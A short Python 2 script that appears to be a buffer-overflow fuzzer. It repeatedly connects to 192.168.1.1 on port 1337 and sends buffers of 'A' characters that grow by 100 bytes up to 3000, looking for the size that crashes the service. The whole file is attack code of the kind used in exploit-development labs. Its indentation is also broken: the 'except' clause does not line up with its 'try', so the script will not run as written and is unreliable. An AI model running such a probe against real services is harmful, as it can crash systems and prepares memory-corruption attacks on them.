#!/usr/bin/python
import socket
import time
import traceback

targetIP = "192.168.1.1"
targetPort = 1337
dataSize = 100

while(dataSize < 3000):
  try:
    print "\nSending %s bytes of data..." % dataSize
    
    bufferFill = "A" * dataSize
    data = bufferFill

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect((targetIP, targetPort))
    s.send(data)
    s.close()

    dataSize += 100
    time.sleep(1)

except Exception:
  traceback.print_exc()